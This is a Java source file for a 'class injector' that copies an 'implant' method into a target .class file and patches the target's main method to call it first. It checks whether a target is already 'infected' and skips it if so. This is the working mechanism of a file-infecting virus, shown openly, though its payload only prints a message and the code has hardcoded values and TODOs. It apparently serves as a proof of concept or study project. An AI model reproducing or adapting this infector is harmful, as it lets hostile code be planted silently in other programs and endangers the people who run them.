package org.example.injector;

import javassist.bytecode.*;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.security.CodeSource;
import java.util.HashMap;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class Injector {
    public static void main(String[] args) {
        System.out.println("    |-----[==Class=Injector=v0.1==]-----");
        if (args.length == 0) {
            System.out.println("[-] Usage: java -jar classinjector.jar org.example.injector.Injector <target-class-file>");
            System.exit(1);
        }

        final Path selfPath;
        try {
            selfPath = getSelf();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("[i] Source class file: " + selfPath);

        Path target = Path.of(args[0]);
        System.out.println("[i] Target class file: " + target);
        if (!Files.exists(target) || !Files.isWritable(target)) {
            System.out.println("[!] Target class file does not exist or is not writable!");
            System.exit(2);
        }

        MethodInfo implant;
        try {
            implant = Injector.readImplant(selfPath, "implant");
            System.out.println("[+] Read and serialized payload: " + implant);
        } catch (IOException e) {
            System.out.println("[!] Failed to read payload! Error message: " + e.getMessage());
            System.exit(3);
            throw new RuntimeException("Unreachable", e);
        }

        final boolean isAlreadyInfected;
        try {
            isAlreadyInfected = Injector.isInfected(target, implant);
        } catch (IOException e) {
            System.out.println(("[!] Cannot read class! Error message: " + e.getMessage()));
            System.exit(4);
            throw new RuntimeException("Unreachable");
        }

        if (isAlreadyInfected) {
            System.out.println("[-] Target class already infected. Skipping.");
            System.exit(5);
        }

        final boolean didInfect;
        try {
            didInfect = Injector.infectTarget(target, implant);
        } catch (IOException e) {
            System.out.println("[!] Cannot infect target class file! Error message: " + e.getMessage());
            System.exit(4);
            throw new RuntimeException("Unreachable");
        }

        if (!didInfect) {
            System.out.println("[-] Target class not suitable for infection. Skipping.");
        } else {
            System.out.println("[+] Infected target class: " + target);
        }
    }

    // This is the method that will be transplanted into the target
    public static void implant() {
        System.out.println("This is the implant!");
    }

    private static Path getSelf() throws IOException {
        CodeSource codeSource = Injector.class.getProtectionDomain().getCodeSource();
        if (codeSource == null) {
            // Can't find oneself
            throw new RuntimeException("Can't determine the path to the class file that defines this program");
        }
        Path sourcePath = Path.of(codeSource.getLocation().getPath());

        // Build the entire path based on the source path + package name + class extension
        Class<Injector> self = Injector.class;
        if (Files.isDirectory(sourcePath)) {
            String[] packageHierarchy = self.getName().split("\\.");
            packageHierarchy[packageHierarchy.length - 1] += ".class";

            for (String pack : packageHierarchy) {
                sourcePath = sourcePath.resolve(pack);
            }
        } else {
            // TODO Don't just assume it's a JAR file
            try (JarFile jarFile = new JarFile(sourcePath.toFile())) {
                String lookingForFileName = self.getName().replace(".", File.separator) + ".class";
                System.out.println("[i] We're running from a JAR. Looking for class " + lookingForFileName);

                JarEntry theClass = (JarEntry) jarFile.getEntry(lookingForFileName);
                if (theClass == null) {
                    System.out.println("[!] Did not find the class file in JAR!");
                    throw new RuntimeException("Cannot find class: " + lookingForFileName);
                }

                InputStream inputStream = jarFile.getInputStream(theClass);
                // TODO Just return this input stream (readImplant() could use it) - Don't mess around with tempfiles!
                Path tempFile = File.createTempFile("TheThing", ".class").toPath();
                Files.copy(inputStream, tempFile, StandardCopyOption.REPLACE_EXISTING);

                sourcePath = tempFile;  // This is just bad

                /*Enumeration<JarEntry> entries = jarFile.entries();
                while (entries.hasMoreElements()) {
                    JarEntry entry = entries.nextElement();
                    if (entry.getName().equals(lookingForFileName)) {
                        System.out.println("[i] Found class file in JAR: " + entry.getName());
                        // TODO Now what? Extend readImplant() with ability to dig around in JAR files, too.
                        Path theThing = Files.createTempFile("TheThing", ".class");

                    }
                }*/
            }
        }

        if (!Files.isRegularFile(sourcePath)) {
            throw new RuntimeException("Unexpected source: " + sourcePath);
        }

        return sourcePath;
    }

    private static MethodInfo readImplant(final Path classFilePath, final String sourceMethodName) throws IOException {
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
        ClassFile cf = new ClassFile(new DataInputStream(in));
        MethodInfo implantMethod = cf.getMethod(sourceMethodName);

        if (implantMethod == null) {
            throw new IOException("Cannot find method '" + sourceMethodName + "' in " + classFilePath);
        }

        return implantMethod;
    }

    public static boolean isInfected(final Path classFilePath, final MethodInfo implant) throws IOException {
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
        ClassFile cf = new ClassFile(new DataInputStream(in));
        in.close();

        return cf.getMethod(implant.getName()) != null;
    }

    public static boolean infectTarget(final Path classFilePath, final MethodInfo implantMethod) throws IOException {
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(classFilePath.toFile()));
        ClassFile cf = new ClassFile(new DataInputStream(in));
        in.close();

        MethodInfo main = cf.getMethod("main");
        if (main == null) {
            // Only infect classes with a main function.
            return false;
        }

        // Add the implant method to target class
        MethodInfo targetImplantMethod;
        try {
            // Construct a target method from the source (implant) method
            ConstPool constPool = cf.getConstPool();
            targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
            targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
            HashMap<String, String> classTranslation = new HashMap<>();
            CodeAttribute copy = (CodeAttribute) implantMethod.getCodeAttribute().copy(constPool, classTranslation);
            copy.setMaxLocals(10);  // Don't know why this is necessary, but it throws an error otherwise

            // Make it static.
            int accessFlags = implantMethod.getAccessFlags();
            accessFlags |= AccessFlag.STATIC;   // Yes, bit-flipping!
            targetImplantMethod.setAccessFlags(accessFlags);

            targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
            targetImplantMethod.setCodeAttribute(copy);

            cf.addMethod(targetImplantMethod);
        } catch (DuplicateMemberException e) {
            // Class already infected
            return false;
        }

        // Modify the main method of the target class to run the implant method (before its own code)
        Bytecode newCode = new Bytecode(cf.getConstPool());
        // TODO Don't hardcode the package name
        newCode.addInvokestatic("org.example.target.Main", targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
        CodeAttribute newCodeAttr = newCode.toCodeAttribute();

        CodeAttribute mainCode = main.getCodeAttribute();
        ByteBuffer buff = ByteBuffer.allocate(newCodeAttr.getCodeLength() + main.getCodeAttribute().getCodeLength());
        buff.put(newCodeAttr.getCode());
        buff.put(mainCode.getCode());

        CodeAttribute newCodeAttribute = new CodeAttribute(cf.getConstPool(), mainCode.getMaxStack(), mainCode.getMaxLocals(), buff.array(), mainCode.getExceptionTable());
        main.setCodeAttribute(newCodeAttribute);

        cf.write(new DataOutputStream(new FileOutputStream(classFilePath.toFile())));

        return true;
    }
}